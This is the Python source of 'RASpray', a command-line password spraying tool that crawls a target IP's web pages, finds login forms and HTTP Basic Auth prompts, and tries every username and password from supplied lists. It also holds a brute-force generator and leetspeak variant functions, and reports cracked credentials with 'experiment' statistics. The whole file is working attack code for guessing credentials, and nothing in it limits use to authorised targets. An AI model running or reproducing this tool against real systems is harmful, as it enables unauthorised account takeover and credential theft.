#!/usr/bin/env python3

import sys
import os
import re
import requests
import psutil
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth
from requests.exceptions import RequestException, Timeout, ConnectionError
from urllib.parse import urljoin
from colorama import Fore, Style, init
import time
import itertools
from datetime import datetime

# Define the tool's name and version
TOOL_NAME = "RASpray"
VERSION = "1.0.0"

# Global variables for tracking experiment data
total_attempts = 0
successful_attempts = 0
start_time = None
memory_usage_per_phase = []



# Get the current process for tracking program-specific resource usage
process = psutil.Process(os.getpid())

# Function to log memory usage
def log_resource_usage(phase, page):
    memory = process.memory_percent()  # Percentage of RAM used by the process
    print(f"[{phase}] Page: {page} - Memory: {memory}%")
    memory_usage_per_phase.append((phase, memory))



# Function to start tracking time
def start_timer():
    global start_time
    start_time = datetime.now()

# Function to end tracking time and return elapsed time in seconds
def end_timer():
    global start_time
    end_time = datetime.now()
    return (end_time - start_time).total_seconds()

# Function to display the RASPRAY banner
def display_banner():
    banner = r"""
    
    ██████╗  █████╗     ███████╗██████╗ ██████╗  █████╗ ██╗   ██╗
    ██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
    ██████╔╝███████║    ███████╗██████╔╝██████╔╝███████║ ╚████╔╝ 
    ██╔══██╗██╔══██║    ╚════██║██╔═══╝ ██╔══██╗██╔══██║  ╚██╔╝  
    ██║  ██║██║  ██║    ███████║██║     ██║  ██║██║  ██║   ██║   
    ╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                                             
    Version: 1.0.0
    """
    print(f"{Fore.RED}{banner}{Style.RESET_ALL}")

# Function to display help message
def display_help():
    """
    Displays the help message with tool usage and options.
    """
    help_text = f"""
    {TOOL_NAME} - Password Spraying Tool (v{VERSION})
    
    Usage: {TOOL_NAME} [options]

    Options:
        -h, --help                  Show this help message and exit
        -u, --users                 Specify the file containing usernames
        -p, --pass                  Specify the file containing passwords
        -i, --ip                    Specify the target IP address
        --version                   Show the tool version and exit
        
        Username Criteria:
        --username-min-len          Specify the minimum length of usernames
        --username-max-len          Specify the maximum length of usernames
        --username-uppercase        Require at least 1 uppercase letter in usernames
        --username-lowercase        Require at least 1 lowercase letter in usernames
        --username-numbers          Require at least 1 number in usernames
        --username-special-chars    Require at least 1 special character in usernames (e.g., !, @, #)

        Password Criteria:
        --password-min-len          Specify the minimum length of passwords
        --password-max-len          Specify the maximum length of passwords
        --password-uppercase        Require at least 1 uppercase letter in passwords
        --password-lowercase        Require at least 1 lowercase letter in passwords
        --password-numbers          Require at least 1 number in passwords
        --password-special-chars    Require at least 1 special character in passwords (e.g., !, @, #)
    """
    print(help_text)

# Function to display the version
def display_version():
    """
    Displays the current version of the tool.
    """
    print(f"{TOOL_NAME} version {VERSION}")

# Function to traverse a website and find password fields or BasicAuth requests
def traverse_website(base_url, session, max_depth=3):
    """
    Traverses the website starting from the base URL. Follows links found on each page.
    Implements a depth limit to avoid deep crawling and infinite loops.
    
    Args:
        base_url (str): The starting URL of the website.
        session (Session): The session object to maintain cookies across requests.
        max_depth (int): Maximum depth to traverse the website.

    Returns:
        list: A list of URLs found on the website.
    """
    visited = set()
    to_visit = [(base_url, 0)]  # (URL, depth)
    links = []

    while to_visit:
        url, depth = to_visit.pop(0)
        if depth > max_depth:
            continue
        
        if url in visited:
            continue
        
        visited.add(url)
        
        try:
            response = session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Collect all links on the page
            for a in soup.find_all('a', href=True):
                full_url = urljoin(base_url, a['href'])
                
                # Only add unvisited links to the list
                if full_url not in visited:
                    links.append(full_url)
                    to_visit.append((full_url, depth + 1))

        except RequestException as e:
            print(f"Error traversing {url}: {e}")
    
    return links

def is_password_requested_basic_auth(url, session):
    """
    Checks if the given page requires HTTP Basic Authentication.

    Args:
        url (str): The URL of the page to check.
        session (Session): The session object to make requests.

    Returns:
        bool: True if the page prompts for Basic Authentication, False otherwise.
    """
    try:
        # Send a GET request to check if BasicAuth is required
        response = session.get(url, timeout=10, allow_redirects=False)
    
        # Check if the response is a 401 Unauthorized indicating BasicAuth is needed
        if response.status_code == 401:
            # print(f"{Fore.GREEN}BasicAuth required on {url}") // Can be useful when debugging
            return True
        
        elif response.status_code == 403:
            print(f"{Fore.RED}Access forbidden. Reason: {response.reason}")
        
        else:
            # print(f"{Fore.WHITE}No BasicAuth required on {url}") // Can be useful when debugging
            return False
        
    except RequestException as e:
        print(f"Error checking {url}: {e}")
        return False
    

    
    
def is_password_requested_basic_password_field(url, session):
    """
    Checks if the given page contains an input field for a password.

    Args:
        url (str): The URL of the page to check.
        session (Session): The session object to make requests.

    Returns:
        bool: True if the page contains a password field, False otherwise.
    """
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')

        # Parse HTML to look for password fields more robustly
        password_fields = soup.find_all('input', {'type': 'password'})

        # Also check for any form that looks like a login form
        if password_fields or is_login_form_present(response.text):
            print(f"{Fore.GREEN}Password field found on {url}")
            return True
        else:
            # print(f"{Fore.WHITE}No password field on {url}") // Can be useful when debugging
            return False

    except RequestException as e:
        print(f"Error checking {url}: {e}")
        return False



# Parse user-specified criteria
criteria = {
    'username_min_len': int(sys.argv[sys.argv.index('--username-min-len') + 1]) if '--username-min-len' in sys.argv else None,
    'username_max_len': int(sys.argv[sys.argv.index('--username-max-len') + 1]) if '--username-max-len' in sys.argv else None,
    'username_uppercase': '--username-uppercase' in sys.argv,
    'username_lowercase': '--username-lowercase' in sys.argv,
    'username_numbers': '--username-numbers' in sys.argv,
    'username_special_chars': '--username-special-chars' in sys.argv,
    
    'password_min_len': int(sys.argv[sys.argv.index('--password-min-len') + 1]) if '--password-min-len' in sys.argv else None,
    'password_max_len': int(sys.argv[sys.argv.index('--password-max-len') + 1]) if '--password-max-len' in sys.argv else None,
    'password_uppercase': '--password-uppercase' in sys.argv,
    'password_lowercase': '--password-lowercase' in sys.argv,
    'password_numbers': '--password-numbers' in sys.argv,
    'password_special_chars': '--password-special-chars' in sys.argv
}

# Modify filter_by_criteria function to handle username and password criteria separately
def filter_by_criteria(items, min_len=None, max_len=None, uppercase=False, lowercase=False, numbers=False, special_chars=False):
    """
    Filters a list of usernames or passwords based on specified criteria.
    
    Args:
        items (list): A list of usernames or passwords to filter.
        min_len (int): Minimum length.
        max_len (int): Maximum length.
        uppercase (bool): Require uppercase letters.
        lowercase (bool): Require lowercase letters.
        numbers (bool): Require numbers.
        special_chars (bool): Require special characters.

    Returns:
        list: A filtered list of usernames or passwords.
    """
    filtered = []
    
    for item in items:
        if min_len and len(item) < min_len:
            continue
        if max_len and len(item) > max_len:
            continue
        if uppercase and not re.search(r'[A-Z]', item):
            continue
        if lowercase and not re.search(r'[a-z]', item):
            continue
        if numbers and not re.search(r'\d', item):
            continue
        if special_chars and not re.search(r'[!@#$%^&*(),.?":{}|<>]', item):
            continue
        filtered.append(item)
    
    return filtered



# Function to extract form fields from a login page
def extract_form_fields(soup):
    """
    Extracts all the form fields from the login page's HTML soup object.
    
    Args:
        soup (BeautifulSoup): The parsed HTML content of the page.

    Returns:
        dict: A dictionary containing form field names and their corresponding values.
    """
    form_data = {}
    form = soup.find('form')

    if form is None:
        return form_data

    # Extract all input fields in the form
    for input_tag in form.find_all('input'):
        field_name = input_tag.get('name')
        field_value = input_tag.get('value', '')

        if field_name:
            form_data[field_name] = field_value

    return form_data


def attempt_login_with_form(full_url, session, username, password):
    """
    Attempts to login by submitting the form with the username and password.
    
    Args:
        full_url (str): The URL to submit the form to.
        session (Session): The session object to maintain cookies across requests.
        username (str): The username to attempt.
        password (str): The password to attempt.
    
    Returns:
        tuple or None: Returns a tuple of (username, password) if successful, otherwise None.
    """
    try:
        # Load the login page to retrieve form fields
        response = session.get(full_url)
        soup = BeautifulSoup(response.text, 'html.parser')

        # Extract the form fields and update with credentials
        form_data = extract_form_fields(soup)
        form_data['username'] = username
        form_data['password'] = password

        # Extract form action URL (relative or absolute)
        form = soup.find('form')
        action_url = form.get('action') if form else full_url
        action_url = urljoin(full_url, action_url)
        # print(f"{Fore.WHITE}Submitting form to {action_url} with {username}:{password}") // Can be useful when debugging

        # Submit the form data via POST
        login_response = session.post(action_url, data=form_data, allow_redirects=False)

        # Check if the response indicates a redirect (302/303)
        if login_response.status_code in [302, 303]:
            # print(f"{Fore.GREEN}Redirect detected after login attempt, likely successful. Redirect URL: {login_response.headers.get('Location', '')}") // Can be useful when debugging
            return (username, password)
        
        # Check for specific keywords indicating successful login in the response content
        if "welcome" in login_response.text.lower() or "logout" in login_response.text.lower():
            print(f"{Fore.GREEN}Login successful for {username} on {full_url}")
            return (username, password)
        
        # Print the reason why the login might have failed (snippet of the error)
        failure_reason = extract_failure_reason(login_response.text)
        # print(f"{Fore.RED}Login failed for {username} on {full_url}. Reason: {failure_reason}") // Can be useful when debugging
        return None

    except (RequestException, Timeout, ConnectionError) as e:
        print(f"Error during login attempt on {full_url}: {e}")
        return None


# Function to ask the user if they want to attempt bruteforce
def ask_for_bruteforce():
    while True:
        user_input = input(f"{Fore.YELLOW}All combinations tried. Do you want to perform bruteforce attack? (yes/no): ").lower()
        if user_input in ['yes', 'no']:
            return user_input == 'yes'
        print("Invalid input. Please type 'yes' or 'no'.")

# Function to apply common character substitutions to a string
def apply_common_substitutions(password):
    substitutions = {
        'a': '4',
        'e': '3',
        'i': '1',
        'o': '0',
        's': '$'
    }
    
    for char, replacement in substitutions.items():
        password = password.replace(char, replacement)
    
    return password

# Function to generate all possible character replacements
def generate_password_variants(password):
    substitutions = {
        'a': ['a', '4'],
        'e': ['e', '3'],
        'i': ['i', '1'],
        'o': ['o', '0'],
        's': ['s', '$']
    }

    variants = [''.join(p) for p in itertools.product(
        *[substitutions.get(char, [char]) for char in password]
    )]
    
    return variants

def perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check, delay=1):
    """
    Performs brute force attempts on login forms or BasicAuth with a time delay between each attempt.

    Args:
        username_file (str): Path to the username file.
        password_file (str): Path to the password file.
        ip_address (str): IP address of the target.
        criteria (dict): Criteria for usernames and passwords.
        session (Session): Session object to maintain cookies across requests.
        pages_to_check (list): List of pages to attempt brute force on.
        delay (int): Time delay (in seconds) between each brute force attempt.
    """
    print(f"{Fore.YELLOW}Starting brute force attack...{Style.RESET_ALL}")

    # Load and filter usernames
    with open(username_file, 'r') as user_file:
        usernames = [line.strip() for line in user_file.readlines()]
    usernames = filter_by_criteria(
        usernames,
        min_len=criteria.get('username_min_len'),
        max_len=criteria.get('username_max_len'),
        uppercase=criteria.get('username_uppercase', False),
        lowercase=criteria.get('username_lowercase', False),
        numbers=criteria.get('username_numbers', False),
        special_chars=criteria.get('username_special_chars', False)
    )

    # Characters to use for brute-force passwords
    bruteforce_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"

    for page in pages_to_check:
        full_url = urljoin(f'http://{ip_address}', page)
        credentials_found = False  # Flag to stop further attempts once successful
        
        # Determine the authentication type for the page only once
        requires_password_field = is_password_requested_basic_password_field(full_url, session)
        requires_basic_auth = is_password_requested_basic_auth(full_url, session)

        if requires_password_field or requires_basic_auth:
            for length in range(criteria.get('password_min_len', 1), criteria.get('password_max_len', 8) + 1):
                for password_tuple in itertools.product(bruteforce_chars, repeat=length):
                    bruteforce_password = ''.join(password_tuple)
                    
                    # Apply criteria to generated passwords
                    filtered_passwords = filter_by_criteria(
                        [bruteforce_password],
                        min_len=criteria.get('password_min_len'),
                        max_len=criteria.get('password_max_len'),
                        uppercase=criteria.get('password_uppercase', False),
                        lowercase=criteria.get('password_lowercase', False),
                        numbers=criteria.get('password_numbers', False),
                        special_chars=criteria.get('password_special_chars', False)
                    )
                    if not filtered_passwords:
                        continue  # Skip passwords that do not meet criteria
                    
                    # Proceed with login attempt only if criteria are met
                    print(f"{Fore.WHITE}Trying brute-force password: {bruteforce_password}{Style.RESET_ALL}")
                    
                    for username in usernames:
                        if requires_password_field:
                            credentials = attempt_login_with_form(full_url, session, username, bruteforce_password)
                        elif requires_basic_auth:
                            response = session.get(full_url, auth=HTTPBasicAuth(username, bruteforce_password))
                            if response.status_code == 200:
                                credentials = (username, bruteforce_password)
                            else:
                                credentials = None
                        
                        # If successful, print and return
                        if credentials:
                            print(f"{Fore.GREEN}Success! Username: {credentials[0]}, Password: {credentials[1]} on {full_url}")
                            return  # Stop after the first successful brute-force attempt
                        
                        # Add delay between attempts
                        time.sleep(delay)



                        
                        
# Helper function to check if the response contains a login form
def is_login_form_present(html_content):
    """
    Checks if the provided HTML content contains a login form (i.e., username and password fields).
    
    Args:
        html_content (str): The HTML content to check.

    Returns:
        bool: True if a login form is present, False otherwise.
    """
    soup = BeautifulSoup(html_content, 'html.parser')
    username_field = soup.find('input', {'name': 'username'})
    password_field = soup.find('input', {'name': 'password'})
    
    # If both username and password fields are found, it's likely a login form
    return username_field is not None and password_field is not None

def extract_failure_reason(html_content):
    """
    Extracts potential failure reasons from the login response content.
    
    Args:
        html_content (str): The HTML content to parse.

    Returns:
        str: A snippet of the content indicating the reason for the login failure.
    """
    soup = BeautifulSoup(html_content, 'html.parser')
    
    # Look for common elements that might contain error messages
    error_messages = soup.find_all(['div', 'span', 'p', 'li'], class_=re.compile(r'error|alert|warning|message', re.I))
    error_texts = [msg.get_text(strip=True) for msg in error_messages if msg.get_text(strip=True)]
    
    # If no specific error messages are found, provide a fallback snippet from the page
    if not error_texts:
        return soup.get_text(strip=True)[:600]  # Return the first 600 characters of the page content as a fallback
    
    # Join the extracted error messages into a single string
    return ' | '.join(error_texts)

# Modify the password_spraying function to include bruteforce and character substitution
def password_spraying(ip_address, username_file, password_file, criteria):
    successful_cracks = []
    failed_cracks = []
    global total_attempts, successful_attempts

    # Open the username and password files
    with open(username_file, 'r') as user_file:
        usernames = [line.strip() for line in user_file.readlines()]

    with open(password_file, 'r') as pass_file:
        passwords = [line.strip() for line in pass_file.readlines()]

    # Filter usernames and passwords by the specified criteria
    usernames = filter_by_criteria(usernames, 
                                   min_len=criteria['username_min_len'], 
                                   max_len=criteria['username_max_len'], 
                                   uppercase=criteria['username_uppercase'], 
                                   lowercase=criteria['username_lowercase'], 
                                   numbers=criteria['username_numbers'], 
                                   special_chars=criteria['username_special_chars'])

    passwords = filter_by_criteria(passwords, 
                                   min_len=criteria['password_min_len'], 
                                   max_len=criteria['password_max_len'], 
                                   uppercase=criteria['password_uppercase'], 
                                   lowercase=criteria['password_lowercase'], 
                                   numbers=criteria['password_numbers'], 
                                   special_chars=criteria['password_special_chars'])

    # Create a session to persist cookies across requests
    session = requests.Session()

    # Traverse through the website and find pages with password fields or BasicAuth
    base_url = f'http://{ip_address}'
    pages_to_check = traverse_website(base_url, session)
    pages_to_check = list(set(pages_to_check))  # Remove duplicates

    
    #start_timer()
    log_resource_usage("Initial Connection","")
    total_pages_field = 0 # stores the total number of pages that have any authentication fields
    for page in pages_to_check:        
        full_url = urljoin(base_url, page)
        credentials_found = False  # Flag to stop further attempts once successful
        log_resource_usage(f"{Fore.WHITE}Login at page", full_url)


        # Check if the page has a password field (form-based authentication)
        if is_password_requested_basic_password_field(full_url, session):
            total_pages_field +=1
            for password in passwords:
                for username in usernames:
                    try:
                        # print(f"{Fore.WHITE}Trying username: {username} and password: {password}") // Can be useful when debugging
                        credentials = attempt_login_with_form(full_url, session, username, password)
                        total_attempts = total_attempts+1

                        if credentials:
                            print(f"{Fore.GREEN}Success! Username: {credentials[0]}, Password: {credentials[1]} on {full_url}")
                            successful_attempts = successful_attempts +1
                            successful_cracks.append((full_url, credentials[0], credentials[1]))
                            break
                        else:
                            failed_cracks.append((full_url, username, password))
                    except (Timeout, ConnectionError):
                        print(f"{Fore.RED}Connection failed for {full_url}")
                        time.sleep(1)
                    except RequestException as e:
                        print(f"{Fore.RED}An error occurred: {e}")
                        time.sleep(1)
                    #time.sleep(1)

        if is_password_requested_basic_auth(full_url, session):
            start_timer()
            total_pages_field +=1
            for password in passwords:
                for username in usernames:
                    try:
                        # print(f"{Fore.WHITE}Trying BasicAuth with username: {username} and password: {password}") // Can be useful when debugging
                        response = session.get(full_url, auth=HTTPBasicAuth(username, password))
                        total_attempts = total_attempts+1
                        if response.status_code == 200:
                            print(f"{Fore.GREEN}Success! BasicAuth credentials: Username: {username}, Password: {password} on {full_url}")
                            successful_cracks.append((full_url, username, password))
                            successful_attempts = successful_attempts +1
                            break
                        else:
                            '''
                            # Print a more detailed error reason based on the response code
                            if response.status_code == 401:
                                print(f"{Fore.RED}Failed! Unauthorized (401) with Username: {username}, Password: {password} on {full_url}")
                            elif response.status_code == 403:
                                print(f"{Fore.RED}Failed! Forbidden (403) with Username: {username}, Password: {password} on {full_url}")
                            else:
                                print(f"{Fore.RED}Failed! BasicAuth with Username: {username}, Password: {password} on {full_url} Reason: {response.reason}") #// Can be useful when debugging
                            '''
                            failed_cracks.append((full_url, username, password))

                    except (Timeout, ConnectionError):
                        print(f"{Fore.RED}Connection failed for {full_url}")
                        time.sleep(1)
                    except RequestException as e:
                        print(f"{Fore.RED}An error occurred: {e}")
                        time.sleep(1)
            duration = end_timer()
    # duration = end_timer()
            
    # After exhausting all combinations, ask if the user wants to proceed with bruteforce
    #if ask_for_bruteforce():
        #perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check)

    '''
    if failed_cracks:
        print(f"{Fore.RED}Failed pages that required a password:")
        for page, user, pwd in failed_cracks:
            print(f"{Fore.WHITE}Page: {page}, Username: {user}, Password: {pwd}")
    '''
    if failed_cracks: ### if uncommenting the code above when debugging, make sure to comment this if statement (not the else)
        pass
    else:
        print(f"{Fore.GREEN}No failed password cracking attempts.")
    
    # Summary of Cracking Attempts
    print(f"{Fore.WHITE}\n--- Summary of Cracking Attempts ---")
    if successful_cracks:
        print(f"{Fore.GREEN}Successfully cracked pages:")
        for page, user, pwd in successful_cracks:
            print(f"{Fore.WHITE}Page: {page}, Username: {user}, Password: {pwd}")
    else:
        print(f"{Fore.RED}No successful cracking attempts.")
    
    print(f"{Fore.YELLOW}\n======== Experiment Summary ========{Style.RESET_ALL}")
    print(f"Total Attempts: {total_attempts}")
    print(f"Successful Attempts: {successful_attempts}")
    print(f"Total Pages Checked: {total_pages_field}")
    print(f"Success Rate: {successful_attempts / total_pages_field * 100:.2f}%")
    print(f"Duration of Experiment: {duration} seconds")
    print(f"Average Duration per Attempt: {duration / total_attempts:.4f} seconds")

    # Resource Utilization Summary
    print(f"{Fore.YELLOW}\n--- Resource Utilization ---{Style.RESET_ALL}")
    for i, (phase, memory) in enumerate(memory_usage_per_phase):
        memory = memory_usage_per_phase[i][1]  # Access the corresponding memory usage
        print(f"{Fore.CYAN}{phase} - Memory: {memory}%")




# Main function
def main():
    """
    The main function that parses command-line arguments and initiates the password spraying process.
    """
    # Display the banner
    display_banner()

    # Check if the user requested help or version
    if len(sys.argv) > 1:
        if sys.argv[1] in ['-h', '--help']:
            display_help()
            sys.exit(0)
        elif sys.argv[1] == '--version':
            display_version()
            sys.exit(0)
    
    # Check if the required arguments are provided
    if '-u' not in sys.argv or '-p' not in sys.argv or '-i' not in sys.argv:
        print("Missing required arguments! Use --help for usage instructions.")
        sys.exit(1)
    
    # Parse user-specified criteria
    criteria = {
        'username_min_len': int(sys.argv[sys.argv.index('--username-min-len') + 1]) if '--username-min-len' in sys.argv else 1, # making sure that the minumum length is 1 if user doesn't enter
        'username_max_len': int(sys.argv[sys.argv.index('--username-max-len') + 1]) if '--username-max-len' in sys.argv else 20, # making sure that the maximum length is 20 if user doesn't enter
        'username_uppercase': '--username-uppercase' in sys.argv,
        'username_lowercase': '--username-lowercase' in sys.argv,
        'username_numbers': '--username-numbers' in sys.argv,
        'username_special_chars': '--username-special-chars' in sys.argv,
        
        'password_min_len': int(sys.argv[sys.argv.index('--password-min-len') + 1]) if '--password-min-len' in sys.argv else 1,
        'password_max_len': int(sys.argv[sys.argv.index('--password-max-len') + 1]) if '--password-max-len' in sys.argv else 20,
        'password_uppercase': '--password-uppercase' in sys.argv,
        'password_lowercase': '--password-lowercase' in sys.argv,
        'password_numbers': '--password-numbers' in sys.argv,
        'password_special_chars': '--password-special-chars' in sys.argv
    }

    # Get the values of the provided arguments
    try:
        ip_address = sys.argv[sys.argv.index('-i') + 1]
        username_file = sys.argv[sys.argv.index('-u') + 1]
        password_file = sys.argv[sys.argv.index('-p') + 1]
    except (ValueError, IndexError):
        print("Invalid arguments! Use --help for usage instructions.")
        sys.exit(1)
    
    # Call the password spraying function
    password_spraying(ip_address, username_file, password_file, criteria)

if __name__ == '__main__':
    main()